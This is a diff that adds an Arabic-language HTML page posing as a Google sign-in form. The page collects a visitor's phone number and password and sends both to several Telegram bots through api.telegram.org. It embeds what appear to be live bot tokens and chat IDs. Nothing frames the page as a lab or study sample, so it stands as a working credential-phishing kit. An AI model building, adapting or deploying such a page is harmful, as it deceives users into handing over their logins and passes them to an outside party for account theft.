@@ -1,0 +1,150 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج تسجيل Google</title>
+  <style>
+    body {
+      margin: 0;
+      background-image: url('background.gif'); /* 👑 غيّر الخلفية */
+      background-size: cover;
+      font-family: Arial, sans-serif;
+    }
+
+    #google-btn {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      right: 20px;
+      margin: auto;
+      width: 120px;
+      height: 40px;
+      background-color: orange;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      text-align: center;
+      line-height: 40px;
+      box-shadow: 0 0 10px #00000055;
+    }
+
+    #login-form {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      border: 2px solid #ccc;
+      padding: 20px;
+      border-radius: 15px;
+      text-align: center;
+      z-index: 999;
+      width: 280px;
+    }
+
+    #login-form input {
+      width: 90%;
+      padding: 8px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+
+    #login-form button {
+      margin-top: 10px;
+      padding: 8px 15px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #togglePassword {
+      position: absolute;
+      margin-top: -33px;
+      margin-left: 230px;
+      cursor: pointer;
+      font-size: 20px;
+    }
+
+  </style>
+</head>
+<body>
+
+<!-- زر Google -->
+<div id="google-btn">Google</div>
+
+<!-- نموذج التسجيل -->
+<div id="login-form">
+  <h3>🟠 تسجيل الدخول إلى Google</h3>
+  <input type="tel" id="phone" placeholder="رقم الهاتف" required><br>
+  
+  <div style="position: relative;">
+    <input type="password" id="password" placeholder="كلمة السر" required>
+    <span id="togglePassword">👁</span>
+  </div>
+  
+  <button onclick="submitLogin()">تسجيل الدخول</button>
+</div>
+
+<script>
+  const bots = [
+    "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M",
+    "8285842532:AAHmsde1O9HAV_oVJ7L3UJVRMCobap8cdwE",
+    "8280042578:AAFuMPgHS9RCaYcxv1eyVppyr8BkJ_xGD5c"
+  ];
+
+  const chatIds = [
+    "7664410054",
+    "7664410067",
+    "7664410043"
+  ];
+
+  // عند الضغط على زر Google
+  document.getElementById("google-btn").onclick = () => {
+    document.getElementById("login-form").style.display = "block";
+  };
+
+  // إظهار / إخفاء كلمة السر
+  document.getElementById("togglePassword").onclick = () => {
+    const pw = document.getElementById("password");
+    pw.type = (pw.type === "password") ? "text" : "password";
+  };
+
+  // إرسال البيانات إلى كل البوتات وكل ID
+  function submitLogin() {
+    const phone = document.getElementById("phone").value.trim();
+    const pass = document.getElementById("password").value.trim();
+    if (!phone || !pass) {
+      alert("يرجى ملء جميع الحقول");
+      return;
+    }
+
+    const message = `📥 تسجيل دخول جديد:\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${pass}`;
+
+    bots.forEach(token => {
+      chatIds.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      });
+    });
+
+    alert("✅ تم إرسال البيانات");
+    document.getElementById("login-form").style.display = "none";
+  }
+</script>
+
+</body>
+</html>
+
